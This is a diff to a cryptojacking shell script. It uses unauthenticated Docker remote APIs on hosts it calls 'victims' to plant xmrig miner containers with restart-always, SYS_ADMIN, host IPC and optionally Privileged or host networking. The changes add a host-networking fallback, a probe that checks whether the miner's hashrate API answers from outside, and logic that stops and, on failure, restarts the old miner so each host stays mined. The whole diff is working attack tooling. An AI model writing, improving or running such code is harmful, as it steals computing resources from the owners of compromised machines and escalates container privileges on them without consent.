@@ -211,12 +211,22 @@ threads_for() {
     [ "$t" -gt 16 ] && t=16
     printf '%s' "$t"
 }
-supbody() {   # $1=args(plain) $2=Memory bytes (0=none) $3=1 to also try Privileged
+supbody() {   # $1=args(plain) $2=Memory bytes (0=none) $3=1 to also try Privileged $4=1 hostnet
     _sup="while :; do /usr/bin/xmrig $1; sleep 10; done"
     _mem="";  [ "${2:-0}" -gt 0 ] && _mem=",\"Memory\":$2"
     _priv=""; [ "${3:-0}" = 1 ] && _priv=",\"Privileged\":true"
-    printf '{"Image":"%s","Entrypoint":["sh","-c"],"Cmd":["%s"],"Labels":{%s},"ExposedPorts":{"47999/tcp":{}},"HostConfig":{"RestartPolicy":{"Name":"always"},"CpuShares":2048,"CapAdd":["SYS_ADMIN"],"IpcMode":"host","PortBindings":{"47999/tcp":[{"HostPort":"47999"}]}%s%s}}' \
-        "$IMAGE" "$_sup" "$TAG" "$_mem" "$_priv"
+    if [ "${4:-0}" = 1 ]; then
+        # Host networking: xmrig binds :47999 straight on the host, so the API does not
+        # depend on docker-proxy/iptables. Measured broken on some of these daemons - a
+        # container whose Cmd carried --http-port still answered nothing on :47999.
+        _pb=',"NetworkMode":"host"'
+    else
+        # Otherwise publish it. A PortBinding needs the host port to be FREE, which is
+        # exactly why the old container is STOPPED before a re-create rather than kept.
+        _pb=',"PortBindings":{"47999/tcp":[{"HostPort":"47999"}]}'
+    fi
+    printf '{"Image":"%s","Entrypoint":["sh","-c"],"Cmd":["%s"],"Labels":{%s},"ExposedPorts":{"47999/tcp":{}},"HostConfig":{"RestartPolicy":{"Name":"always"},"CpuShares":2048,"CapAdd":["SYS_ADMIN"],"IpcMode":"host"%s%s%s}}' \
+        "$IMAGE" "$_sup" "$TAG" "$_pb" "$_mem" "$_priv"
 }
 
 # a host is interesting only if a docker API answers - so verify it IS docker,
@@ -387,12 +397,32 @@ dock_one() {
                 stale="threads not pinned"
             elif ! printf '%s' "$cjcmd" | grep -q -- '--http-port'; then
                 stale="no published hashrate api"
+            elif ! printf '%s' "$cj" | grep -q '"NetworkMode":"host"'; then
+                # The container looks current - but does the published API actually answer
+                # from OUTSIDE? On several of these daemons docker-proxy/iptables does not
+                # forward a published port, so --http-port is set and :47999 is still dead
+                # (measured on box1 itself). Those roll once to the hostnet rung. The
+                # NetworkMode test is the loop guard: after that re-create the container
+                # carries NetworkMode host, so a host that stays silent is not re-created
+                # again and again.
+                if ! curl -sS -m 4 "http://$ip:47999/2/summary" >/dev/null 2>&1; then
+                    stale="api not reachable from outside (wants hostnet)"
+                fi
             elif [ -s "$HEALFILE" ] && grep -qxF "$ip" "$HEALFILE" 2>/dev/null; then
                 stale="underproducing (victim.sh said so)"
             fi
             if [ -n "$stale" ] && [ "$rcount" -lt "$RECREATE_MAX" ]; then
                 oldid="$have"; have=""; rcount=$((rcount + 1))
-                echo "dock: $ip re-creating (stale: $stale) - old stays until the new one runs"
+                echo "dock: $ip re-creating (stale: $stale) - old stopped so the new one can take :47999"
+                # Stop, do NOT delete: the old container is holding host port 47999, and a
+                # create+start with a conflicting PortBinding fails EVERY rung with "port
+                # is already allocated". That is how a "re-creating" host could log the
+                # same line run after run and never actually change. The id stays so the
+                # old can be restarted if every rung fails (see the end of dock_one).
+                if [ -n "${oldid:-}" ]; then
+                    curl -sS $opts --max-time 20 -X POST "$b/containers/$oldid/stop?t=3" >/dev/null 2>&1 || :
+                    oldstop=1
+                fi
                 # heal.list is a queue, not a state: drop the entry so one victim.sh
                 # cycle cannot re-create the same host again and again
                 case "$stale" in
@@ -478,6 +508,7 @@ dock_one() {
     BODYMIN="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDH],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
     BODYSUP=$(supbody "$ARGSH" "$memlim" 0)
     BODYSUPP=$(supbody "$ARGSH" "$memlim" 1)
+    BODYSUPN=$(supbody "$ARGSH" "$memlim" 0 1)
 
     # Rungs, most capable first, each strictly more boring than the last:
     #   1 supervisor + threads + mem cap + SYS_ADMIN/host-ipc   (what we want)
@@ -485,8 +516,16 @@ dock_one() {
     #   3 no supervisor, same flags                             (no sh in the image)
     #   4 bare minimum body                                     (hardened daemon)
     # The host's old container is only deleted AFTER a rung is verified running.
+    # Rungs, most capable first, each strictly more boring than the last:
+    #   1 supervisor + threads + mem cap + SYS_ADMIN/host-ipc   (what we want)
+    #   2 same, but host networking                            (dashboard/NAT broken)
+    #   3 same, but Privileged                                  (MSR/hugepages refused)
+    #   4 no supervisor, no published port                       (no sh in the image)
+    #   5 bare minimum body                                     (hardened daemon)
+    # The host's old container is stopped before this, and only deleted AFTER a rung is
+    # verified running - so a failed re-create costs seconds, never the host.
     rung=0
-    for cand in "$BODYSUP" "$BODYSUPP" "$BODYH" "$BODYMIN"; do
+    for cand in "$BODYSUP" "$BODYSUPN" "$BODYSUPP" "$BODYH" "$BODYMIN"; do
         rung=$((rung + 1))
         if ! r=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
                     -H "Content-Type: application/json" -d "$cand" 2>/dev/null); then
@@ -516,6 +555,14 @@ dock_one() {
         curl -sS $opts --max-time 20 -X DELETE "$b/containers/$cid?force=1" >/dev/null 2>&1 || :
     done
     echo "dock: $ip all $rung rungs failed"
+    # Every rung failed - so the host is currently EMPTY. Put the old one back.
+    if [ -n "${oldid:-}" ] && [ -n "${oldstop:-}" ]; then
+        if curl -fsS $opts --max-time 20 -X POST "$b/containers/$oldid/start" >/dev/null 2>&1; then
+            echo "dock: $ip re-create failed on every rung - OLD CONTAINER RESTARTED, host not empty"
+        else
+            echo "dock: $ip re-create failed and old restart failed - host may be empty now"
+        fi
+    fi
     oldid=""
 }
 
